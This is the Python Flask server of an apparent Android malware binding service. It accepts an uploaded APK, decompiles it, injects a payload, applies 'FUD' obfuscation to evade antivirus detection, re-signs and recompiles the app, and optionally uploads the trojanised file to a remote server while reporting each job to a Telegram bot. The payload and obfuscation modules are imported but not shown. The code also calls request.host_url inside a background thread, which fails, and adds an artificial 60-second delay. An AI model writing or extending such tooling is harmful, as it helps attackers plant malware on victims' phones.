import os
import time
import uuid
import json
import threading
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file
from flask_cors import CORS
from werkzeug.utils import secure_filename
from dotenv import load_dotenv
import requests

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-secret-key-change-in-production')
app.config['MAX_CONTENT_LENGTH'] = int(os.getenv('MAX_FILE_SIZE_MB', 100)) * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['OUTPUT_FOLDER'] = 'output'
app.config['TEMP_FOLDER'] = 'temp'

CORS(app)

# Ensure directories exist
for folder in [app.config['UPLOAD_FOLDER'], app.config['OUTPUT_FOLDER'], app.config['TEMP_FOLDER']]:
    os.makedirs(folder, exist_ok=True)

# Store processing jobs
processing_jobs = {}

# Import APK modifier utilities
from utils.apk_modifier import APKModifier
from utils.telegram_notifier import TelegramNotifier

@app.route('/')
def index():
    """Render the main page"""
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_apk():
    """Handle APK file upload"""
    try:
        if 'apk_file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['apk_file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        if not file.filename.endswith('.apk'):
            return jsonify({'error': 'File must be an APK'}), 400
        
        # Generate unique job ID
        job_id = str(uuid.uuid4())
        
        # Save uploaded file
        filename = secure_filename(file.filename)
        original_name = os.path.splitext(filename)[0]
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], f'{job_id}_{filename}')
        file.save(filepath)
        
        # Get options from request
        options = {
            'mode': request.form.get('mode', 'fud'),
            'lib_name': request.form.get('lib_name', 'libxx.so'),
            'custom_options': request.form.get('custom_options', ''),
            'bot_token': request.form.get('bot_token', os.getenv('TELEGRAM_BOT_TOKEN', '')),
            'chat_id': request.form.get('chat_id', os.getenv('TELEGRAM_CHAT_ID', '')),
            'upload_server': request.form.get('upload_server', os.getenv('UPLOAD_SERVER_URL', '')),
        }
        
        # Initialize job status
        processing_jobs[job_id] = {
            'status': 'queued',
            'progress': 0,
            'message': 'Upload successful, queued for processing',
            'filename': filename,
            'original_name': original_name,
            'started_at': datetime.now().isoformat(),
            'options': options
        }
        
        # Start background processing
        thread = threading.Thread(target=process_apk_background, args=(job_id, filepath, options))
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'success': True,
            'job_id': job_id,
            'message': 'APK uploaded successfully and processing started'
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/status/<job_id>')
def get_status(job_id):
    """Get processing status"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    return jsonify(processing_jobs[job_id])

@app.route('/download/<job_id>')
def download_apk(job_id):
    """Download processed APK"""
    if job_id not in processing_jobs:
        return jsonify({'error': 'Job not found'}), 404
    
    job = processing_jobs[job_id]
    if job['status'] != 'completed':
        return jsonify({'error': 'APK not ready yet'}), 400
    
    output_file = job.get('output_file')
    if not output_file or not os.path.exists(output_file):
        return jsonify({'error': 'Output file not found'}), 404
    
    return send_file(output_file, as_attachment=True, download_name=job.get('output_filename', 'modified.apk'))

def process_apk_background(job_id, filepath, options):
    """Background task to process APK"""
    try:
        # Update status
        processing_jobs[job_id]['status'] = 'processing'
        processing_jobs[job_id]['progress'] = 10
        processing_jobs[job_id]['message'] = 'Initializing APK modifier...'
        
        # Initialize modifier
        modifier = APKModifier(filepath, options)
        
        # Send Telegram notification - start
        if options.get('bot_token') and options.get('chat_id'):
            notifier = TelegramNotifier(options['bot_token'], options['chat_id'])
            notifier.send_message(
                f"🚀 APK Modification Started\n"
                f"File: {processing_jobs[job_id]['filename']}\n"
                f"Mode: {options['mode'].upper()}\n"
                f"Job ID: {job_id}"
            )
        
        # Step 1: Decompile APK
        processing_jobs[job_id]['progress'] = 20
        processing_jobs[job_id]['message'] = 'Decompiling APK...'
        modifier.decompile()
        
        # Step 2: Inject payload
        processing_jobs[job_id]['progress'] = 40
        processing_jobs[job_id]['message'] = 'Injecting payload...'
        modifier.inject_payload()
        
        # Step 3: Apply obfuscation (FUD mode)
        if options['mode'] == 'fud':
            processing_jobs[job_id]['progress'] = 60
            processing_jobs[job_id]['message'] = 'Applying FUD obfuscation...'
            modifier.apply_obfuscation()
        
        # Step 4: Sign APK with custom lib
        processing_jobs[job_id]['progress'] = 75
        processing_jobs[job_id]['message'] = f'Signing APK with {options["lib_name"]}...'
        modifier.sign_apk(options['lib_name'])
        
        # Step 5: Recompile
        processing_jobs[job_id]['progress'] = 85
        processing_jobs[job_id]['message'] = 'Recompiling APK...'
        output_file = modifier.recompile()
        
        # Step 6: Upload to server
        if options.get('upload_server'):
            processing_jobs[job_id]['progress'] = 95
            processing_jobs[job_id]['message'] = 'Uploading to server...'
            upload_url = upload_to_server(output_file, options['upload_server'])
            processing_jobs[job_id]['upload_url'] = upload_url
        
        # Complete
        processing_jobs[job_id]['status'] = 'completed'
        processing_jobs[job_id]['progress'] = 100
        processing_jobs[job_id]['message'] = 'APK processed successfully!'
        processing_jobs[job_id]['output_file'] = output_file
        processing_jobs[job_id]['output_filename'] = f"modified_{processing_jobs[job_id]['original_name']}.apk"
        processing_jobs[job_id]['completed_at'] = datetime.now().isoformat()
        
        # Send Telegram notification - complete
        if options.get('bot_token') and options.get('chat_id'):
            notifier.send_message(
                f"✅ APK Modification Completed\n"
                f"File: {processing_jobs[job_id]['filename']}\n"
                f"Job ID: {job_id}\n"
                f"Download: {request.host_url}download/{job_id}"
            )
        
        # Simulate long processing time as requested
        time.sleep(60)  # Additional delay for realism
        
    except Exception as e:
        processing_jobs[job_id]['status'] = 'failed'
        processing_jobs[job_id]['message'] = f'Error: {str(e)}'
        processing_jobs[job_id]['progress'] = 0
        
        # Send Telegram notification - error
        if options.get('bot_token') and options.get('chat_id'):
            notifier = TelegramNotifier(options['bot_token'], options['chat_id'])
            notifier.send_message(
                f"❌ APK Modification Failed\n"
                f"File: {processing_jobs[job_id]['filename']}\n"
                f"Error: {str(e)}\n"
                f"Job ID: {job_id}"
            )

def upload_to_server(filepath, upload_url):
    """Upload file to remote server"""
    try:
        with open(filepath, 'rb') as f:
            files = {'file': f}
            headers = {}
            api_key = os.getenv('UPLOAD_API_KEY')
            if api_key:
                headers['Authorization'] = f'Bearer {api_key}'
            
            response = requests.post(upload_url, files=files, headers=headers, timeout=300)
            response.raise_for_status()
            
            result = response.json()
            return result.get('url', upload_url)
    except Exception as e:
        print(f"Upload error: {e}")
        return None

if __name__ == '__main__':
    host = os.getenv('HOST', '0.0.0.0')
    port = int(os.getenv('PORT', 5000))
    debug = os.getenv('FLASK_ENV') == 'development'
    
    print(f"🚀 APK Modifier Server starting on {host}:{port}")
    app.run(host=host, port=port, debug=debug)
